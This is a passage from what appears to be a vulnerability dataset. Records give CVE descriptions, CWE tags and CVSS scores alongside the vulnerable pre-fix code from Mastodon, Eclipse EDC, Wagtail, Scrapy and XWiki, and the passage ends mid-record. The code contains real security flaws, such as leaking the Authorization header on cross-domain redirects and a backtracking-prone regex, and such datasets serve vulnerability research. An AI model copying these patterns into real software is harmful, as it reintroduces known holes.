        "def create_for_oauth(auth)\n      # Check if the user exists with provided email. If no email was provided,\n      # we assign a temporary email and ask the user to verify it on\n      # the next step via Auth::SetupController.show\n\n      strategy          = Devise.omniauth_configs[auth.provider.to_sym].strategy\n      assume_verified   = strategy&.security&.assume_email_is_verified\n      email_is_verified = auth.info.verified || auth.info.verified_email || auth.info.email_verified || assume_verified\n      email             = auth.info.verified_email || auth.info.email\n\n      user = User.find_by(email: email) if email_is_verified\n\n      return user unless user.nil?\n\n      user = User.new(user_params_from_auth(email, auth))\n\n      begin\n        user.account.avatar_remote_url = auth.info.image if /\\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\\z/.match?(auth.info.image)\n      rescue Mastodon::UnexpectedResponseError\n        user.account.avatar_remote_url = nil\n      end\n\n      user.mark_email_as_confirmed! if email_is_verified\n      user.save!\n      user\n    end",
        "def self.find_for_oauth(auth)\n    find_or_create_by(uid: auth.uid, provider: auth.provider)\n  end"
      ],
      "hunk_level": [
        {
          "line_no": 10,
          "content": "      @user = User.find_for_oauth(request.env['omniauth.auth'], current_user)"
        },
        {
          "line_no": 22,
          "content": "    def find_for_oauth(auth, signed_in_resource = nil)"
        },
        {
          "line_no": 25,
          "content": "      identity = Identity.find_for_oauth(auth)"
        },
        {
          "line_no": 32,
          "content": "      user ||= create_for_oauth(auth)"
        },
        {
          "line_no": 42,
          "content": "    def create_for_oauth(auth)"
        },
        {
          "line_no": 43,
          "content": "      # Check if the user exists with provided email. If no email was provided,"
        },
        {
          "line_no": 44,
          "content": "      # we assign a temporary email and ask the user to verify it on"
        },
        {
          "line_no": 45,
          "content": "      # the next step via Auth::SetupController.show"
        },
        {
          "line_no": 47,
          "content": "      strategy          = Devise.omniauth_configs[auth.provider.to_sym].strategy"
        },
        {
          "line_no": 48,
          "content": "      assume_verified   = strategy&.security&.assume_email_is_verified"
        },
        {
          "line_no": 49,
          "content": "      email_is_verified = auth.info.verified || auth.info.verified_email || auth.info.email_verified || assume_verified"
        },
        {
          "line_no": 50,
          "content": "      email             = auth.info.verified_email || auth.info.email"
        },
        {
          "line_no": 52,
          "content": "      user = User.find_by(email: email) if email_is_verified"
        },
        {
          "line_no": 54,
          "content": "      return user unless user.nil?"
        },
        {
          "line_no": 20,
          "content": "  def self.find_for_oauth(auth)"
        }
      ]
    },
    "cwe": [
      "CWE-287",
      "CWE-306"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.2,
    "cvss_version": 3.1
  },
  {
    "id": 724,
    "cve": "CVE-2024-4536",
    "description": "In Eclipse Dataspace Components from version 0.2.1 to 0.6.2, in the EDC Connector component ( https://github.com/eclipse-edc/Connector ), an attacker might obtain OAuth2 client secrets from the vault.\n\nIn Eclipse Dataspace Components from version 0.2.1 to 0.6.2, we have identified a security vulnerability in the EDC Connector component ( https://github.com/eclipse-edc/Connector ) regarding the OAuth2-protected data sink feature. When using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider's vault, not the consumer. This secret's value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.\n\nThis feature is now disabled entirely, because not all code paths necessary for a successful realization were fully implemented.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java",
          "content": "/*\n *  Copyright (c) 2021 Microsoft Corporation\n *\n *  This program and the accompanying materials are made available under the\n *  terms of the Apache License, Version 2.0 which is available at\n *  https://www.apache.org/licenses/LICENSE-2.0\n *\n *  SPDX-License-Identifier: Apache-2.0\n *\n *  Contributors:\n *       Microsoft Corporation - initial API and implementation\n *       Siemens AG - changes to make it compatible with AWS S3, Azure blob and ALI Object Storage presigned URL for upload\n *\n */\n\npackage org.eclipse.edc.connector.dataplane.http.oauth2;\n\nimport org.eclipse.edc.connector.dataplane.http.spi.HttpRequestParamsProvider;\nimport org.eclipse.edc.iam.oauth2.spi.client.Oauth2Client;\nimport org.eclipse.edc.keys.spi.PrivateKeyResolver;\nimport org.eclipse.edc.runtime.metamodel.annotation.Extension;\nimport org.eclipse.edc.runtime.metamodel.annotation.Inject;\nimport org.eclipse.edc.spi.security.Vault;\nimport org.eclipse.edc.spi.system.ServiceExtension;\nimport org.eclipse.edc.spi.system.ServiceExtensionContext;\n\nimport java.time.Clock;\n\n/**\n * Provides support for adding OAuth2 authentication to http data transfer\n */\n@Extension(value = DataPlaneHttpOauth2Extension.NAME)\npublic class DataPlaneHttpOauth2Extension implements ServiceExtension {\n    public static final String NAME = \"Data Plane HTTP OAuth2\";\n\n    @Inject\n    private Clock clock;\n\n    @Inject\n    private HttpRequestParamsProvider paramsProvider;\n\n    @Inject\n    private Vault vault;\n\n    @Inject\n    private PrivateKeyResolver privateKeyResolver;\n\n    @Inject\n    private Oauth2Client oauth2Client;\n\n    @Override\n    public String name() {\n        return NAME;\n    }\n\n    @Override\n    public void initialize(ServiceExtensionContext context) {\n        var requestFactory = new Oauth2CredentialsRequestFactory(privateKeyResolver, clock, vault, context.getMonitor());\n        var oauth2ParamsDecorator = new Oauth2HttpRequestParamsDecorator(requestFactory, oauth2Client);\n\n        paramsProvider.registerSinkDecorator(oauth2ParamsDecorator);\n        paramsProvider.registerSourceDecorator(oauth2ParamsDecorator);\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "@Override\n    public void initialize(ServiceExtensionContext context) {\n        var requestFactory = new Oauth2CredentialsRequestFactory(privateKeyResolver, clock, vault, context.getMonitor());\n        var oauth2ParamsDecorator = new Oauth2HttpRequestParamsDecorator(requestFactory, oauth2Client);\n\n        paramsProvider.registerSinkDecorator(oauth2ParamsDecorator);\n        paramsProvider.registerSourceDecorator(oauth2ParamsDecorator);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 61,
          "content": "        paramsProvider.registerSinkDecorator(oauth2ParamsDecorator);"
        }
      ]
    },
    "cwe": [
      "CWE-201",
      "CWE-522"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 965,
    "cve": "CVE-2024-39317",
    "description": "Wagtail is an open source content management system built on Django. A bug in Wagtail's `parse_query_string` would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, `parse_query_string` would take an unexpectedly large amount of time to process, resulting in a denial of service. In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses `parse_query_string`, it may be exploitable by other users (e.g. unauthenticated users). Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "wagtail/search/utils.py",
          "content": "import operator\nimport re\nfrom functools import partial\n\nfrom django.apps import apps\nfrom django.db import connections\nfrom django.http import QueryDict\n\nfrom wagtail.search.index import RelatedFields, SearchField\n\nfrom .query import MATCH_NONE, Phrase, PlainText\n\nNOT_SET = object()\n\n\ndef balanced_reduce(operator, seq, initializer=NOT_SET):\n    \"\"\"\n    Has the same result as Python's reduce function, but performs the calculations in a different order.\n\n    This is important when the operator is constructing data structures such as search query classes.\n    This method will make the resulting data structures flatter, so operations that need to traverse\n    them don't end up crashing with recursion errors.\n\n    For example:\n\n    Python's builtin reduce() function will do the following calculation:\n\n    reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    (1 + (2 + (3 + (4 + (5 + (6 + (7 + 8)))))))\n\n    When using this with query classes, it would create a large data structure with a depth of 7\n    Whereas balanced_reduce will execute this like so:\n\n    balanced_reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    ((1 + 2) + (3 + 4)) + ((5 + 6) + (7 + 8))\n\n    Which only has a depth of 2\n    \"\"\"\n    # Casting all iterables to list makes the implementation simpler\n    if not isinstance(seq, list):\n        seq = list(seq)\n\n    # Note, it needs to be possible to use None as an initial value\n    if initializer is not NOT_SET:\n        if len(seq) == 0:\n            return initializer\n        else:\n            return operator(initializer, balanced_reduce(operator, seq))\n\n    if len(seq) == 0:\n        raise TypeError(\"reduce() of empty sequence with no initial value\")\n    elif len(seq) == 1:\n        return seq[0]\n    else:\n        break_point = len(seq) // 2\n        first_set = balanced_reduce(operator, seq[:break_point])\n        second_set = balanced_reduce(operator, seq[break_point:])\n        return operator(first_set, second_set)\n\n\n# Reduce any iterable to a single value using a logical OR e.g. (a | b | ...)\nOR = partial(balanced_reduce, operator.or_)\n# Reduce any iterable to a single value using a logical AND e.g. (a & b & ...)\nAND = partial(balanced_reduce, operator.and_)\n# Reduce any iterable to a single value using an addition\nADD = partial(balanced_reduce, operator.add)\n# Reduce any iterable to a single value using a multiplication\nMUL = partial(balanced_reduce, operator.mul)\n\nMAX_QUERY_STRING_LENGTH = 255\n\n\ndef normalise_query_string(query_string):\n    # Truncate query string\n    query_string = query_string[:MAX_QUERY_STRING_LENGTH]\n    # Convert query_string to lowercase\n    query_string = query_string.lower()\n\n    # Remove leading, trailing and multiple spaces\n    query_string = re.sub(\" +\", \" \", query_string).strip()\n\n    return query_string\n\n\ndef separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string\n\n\ndef parse_query_string(query_string, operator=None, zero_terms=MATCH_NONE):\n    \"\"\"\n    This takes a query string typed in by a user and extracts the following:\n\n     - Quoted terms (for phrase search)\n     - Filters\n\n    For example, the following query:\n\n      `hello \"this is a phrase\" live:true` would be parsed into:\n\n    filters: {'live': 'true'}\n    tokens: And([PlainText('hello'), Phrase('this is a phrase')])\n    \"\"\"\n    filters, query_string = separate_filters_from_query(query_string)\n\n    is_phrase = False\n    tokens = []\n    if '\"' in query_string:\n        parts = query_string.split('\"')\n    else:\n        parts = query_string.split(\"'\")\n\n    for part in parts:\n        part = part.strip()\n\n        if part:\n            if is_phrase:\n                tokens.append(Phrase(part))\n            else:\n                tokens.append(\n                    PlainText(part, operator=operator or PlainText.DEFAULT_OPERATOR)\n                )\n\n        is_phrase = not is_phrase\n\n    if tokens:\n        if operator == \"or\":\n            search_query = OR(tokens)\n        else:\n            search_query = AND(tokens)\n    else:\n        search_query = zero_terms\n\n    return filters, search_query\n\n\ndef get_descendant_models(model):\n    \"\"\"\n    Returns all descendants of a model, including the model itself.\n    \"\"\"\n    descendant_models = {\n        other_model\n        for other_model in apps.get_models()\n        if issubclass(other_model, model)\n    }\n    descendant_models.add(model)\n    return descendant_models\n\n\ndef get_content_type_pk(model):\n    # We import it locally because this file is loaded before apps are ready.\n    from django.contrib.contenttypes.models import ContentType\n\n    return ContentType.objects.get_for_model(model).pk\n\n\ndef get_ancestors_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the ancestors of this model, excluding it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *model._meta.get_parent_list()\n        ).values()\n    ]\n\n\ndef get_descendants_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the descendants of this model, including it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *get_descendant_models(model)\n        ).values()\n    ]\n\n\ndef get_search_fields(search_fields):\n    for search_field in search_fields:\n        if isinstance(search_field, SearchField):\n            yield search_field\n        elif isinstance(search_field, RelatedFields):\n            yield from get_search_fields(search_field.fields)\n\n\ndef get_postgresql_connections():\n    return [\n        connection\n        for connection in connections.all()\n        if connection.vendor == \"postgresql\"\n    ]\n"
        }
      ],
      "method_level": [
        "def separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string"
      ],
      "hunk_level": [
        {
          "line_no": 86,
          "content": "    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'"
        },
        {
          "line_no": 89,
          "content": "    for match_object in re.finditer(filters_regexp, query_string):"
        },
        {
          "line_no": 91,
          "content": "        filters.update("
        },
        {
          "line_no": 92,
          "content": "            {"
        },
        {
          "line_no": 93,
          "content": "                key: value.strip('\"')"
        },
        {
          "line_no": 94,
          "content": "                if value.strip('\"') is not value"
        },
        {
          "line_no": 95,
          "content": "                else value.strip(\"'\")"
        },
        {
          "line_no": 96,
          "content": "            }"
        },
        {
          "line_no": 97,
          "content": "        )"
        },
        {
          "line_no": 99,
          "content": "    query_string = re.sub(filters_regexp, \"\", query_string).strip()"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 672,
    "cve": "CVE-2024-3574",
    "description": "In scrapy version 2.10.1, an issue was identified where the Authorization header, containing credentials for server authentication, is leaked to a third-party site during a cross-domain redirect. This vulnerability arises from the failure to remove the Authorization header when redirecting across domains. The exposure of the Authorization header to unauthorized actors could potentially allow for account hijacking.",
    "vulnerability": {
      "file_level": [
        {
          "name": "scrapy/downloadermiddlewares/redirect.py",
          "content": "import logging\nfrom urllib.parse import urljoin, urlparse\n\nfrom w3lib.url import safe_url_string\n\nfrom scrapy.exceptions import IgnoreRequest, NotConfigured\nfrom scrapy.http import HtmlResponse\nfrom scrapy.utils.httpobj import urlparse_cached\nfrom scrapy.utils.response import get_meta_refresh\n\nlogger = logging.getLogger(__name__)\n\n\ndef _build_redirect_request(source_request, *, url, **kwargs):\n    redirect_request = source_request.replace(\n        url=url,\n        **kwargs,\n        cookies=None,\n    )\n    if \"Cookie\" in redirect_request.headers:\n        source_request_netloc = urlparse_cached(source_request).netloc\n        redirect_request_netloc = urlparse_cached(redirect_request).netloc\n        if source_request_netloc != redirect_request_netloc:\n            del redirect_request.headers[\"Cookie\"]\n    return redirect_request\n\n\nclass BaseRedirectMiddleware:\n    enabled_setting = \"REDIRECT_ENABLED\"\n\n    def __init__(self, settings):\n        if not settings.getbool(self.enabled_setting):\n            raise NotConfigured\n\n        self.max_redirect_times = settings.getint(\"REDIRECT_MAX_TIMES\")\n        self.priority_adjust = settings.getint(\"REDIRECT_PRIORITY_ADJUST\")\n\n    @classmethod\n    def from_crawler(cls, crawler):\n        return cls(crawler.settings)\n\n    def _redirect(self, redirected, request, spider, reason):\n        ttl = request.meta.setdefault(\"redirect_ttl\", self.max_redirect_times)\n        redirects = request.meta.get(\"redirect_times\", 0) + 1\n\n        if ttl and redirects <= self.max_redirect_times:\n            redirected.meta[\"redirect_times\"] = redirects\n            redirected.meta[\"redirect_ttl\"] = ttl - 1\n            redirected.meta[\"redirect_urls\"] = request.meta.get(\"redirect_urls\", []) + [\n                request.url\n            ]\n            redirected.meta[\"redirect_reasons\"] = request.meta.get(\n                \"redirect_reasons\", []\n            ) + [reason]\n            redirected.dont_filter = request.dont_filter\n            redirected.priority = request.priority + self.priority_adjust\n            logger.debug(\n                \"Redirecting (%(reason)s) to %(redirected)s from %(request)s\",\n                {\"reason\": reason, \"redirected\": redirected, \"request\": request},\n                extra={\"spider\": spider},\n            )\n            return redirected\n        logger.debug(\n            \"Discarding %(request)s: max redirections reached\",\n            {\"request\": request},\n            extra={\"spider\": spider},\n        )\n        raise IgnoreRequest(\"max redirections reached\")\n\n    def _redirect_request_using_get(self, request, redirect_url):\n        redirect_request = _build_redirect_request(\n            request,\n            url=redirect_url,\n            method=\"GET\",\n            body=\"\",\n        )\n        redirect_request.headers.pop(\"Content-Type\", None)\n        redirect_request.headers.pop(\"Content-Length\", None)\n        return redirect_request\n\n\nclass RedirectMiddleware(BaseRedirectMiddleware):\n    \"\"\"\n    Handle redirection of requests based on response status\n    and meta-refresh html tag.\n    \"\"\"\n\n    def process_response(self, request, response, spider):\n        if (\n            request.meta.get(\"dont_redirect\", False)\n            or response.status in getattr(spider, \"handle_httpstatus_list\", [])\n            or response.status in request.meta.get(\"handle_httpstatus_list\", [])\n            or request.meta.get(\"handle_httpstatus_all\", False)\n        ):\n            return response\n\n        allowed_status = (301, 302, 303, 307, 308)\n        if \"Location\" not in response.headers or response.status not in allowed_status:\n            return response\n\n        location = safe_url_string(response.headers[\"Location\"])\n        if response.headers[\"Location\"].startswith(b\"//\"):\n            request_scheme = urlparse(request.url).scheme\n            location = request_scheme + \"://\" + location.lstrip(\"/\")\n\n        redirected_url = urljoin(request.url, location)\n\n        if response.status in (301, 307, 308) or request.method == \"HEAD\":\n            redirected = _build_redirect_request(request, url=redirected_url)\n            return self._redirect(redirected, request, spider, response.status)\n\n        redirected = self._redirect_request_using_get(request, redirected_url)\n        return self._redirect(redirected, request, spider, response.status)\n\n\nclass MetaRefreshMiddleware(BaseRedirectMiddleware):\n    enabled_setting = \"METAREFRESH_ENABLED\"\n\n    def __init__(self, settings):\n        super().__init__(settings)\n        self._ignore_tags = settings.getlist(\"METAREFRESH_IGNORE_TAGS\")\n        self._maxdelay = settings.getint(\"METAREFRESH_MAXDELAY\")\n\n    def process_response(self, request, response, spider):\n        if (\n            request.meta.get(\"dont_redirect\", False)\n            or request.method == \"HEAD\"\n            or not isinstance(response, HtmlResponse)\n        ):\n            return response\n\n        interval, url = get_meta_refresh(response, ignore_tags=self._ignore_tags)\n        if url and interval < self._maxdelay:\n            redirected = self._redirect_request_using_get(request, url)\n            return self._redirect(redirected, request, spider, \"meta refresh\")\n\n        return response\n"
        }
      ],
      "method_level": [
        "def _build_redirect_request(source_request, *, url, **kwargs):\n    redirect_request = source_request.replace(\n        url=url,\n        **kwargs,\n        cookies=None,\n    )\n    if \"Cookie\" in redirect_request.headers:\n        source_request_netloc = urlparse_cached(source_request).netloc\n        redirect_request_netloc = urlparse_cached(redirect_request).netloc\n        if source_request_netloc != redirect_request_netloc:\n            del redirect_request.headers[\"Cookie\"]\n    return redirect_request"
      ],
      "hunk_level": [
        {
          "line_no": 20,
          "content": "    if \"Cookie\" in redirect_request.headers:"
        },
        {
          "line_no": 24,
          "content": "            del redirect_request.headers[\"Cookie\"]"
        }
      ]
    },
    "cwe": [
      "CWE-200"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.0
  },
  {
    "id": 609,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
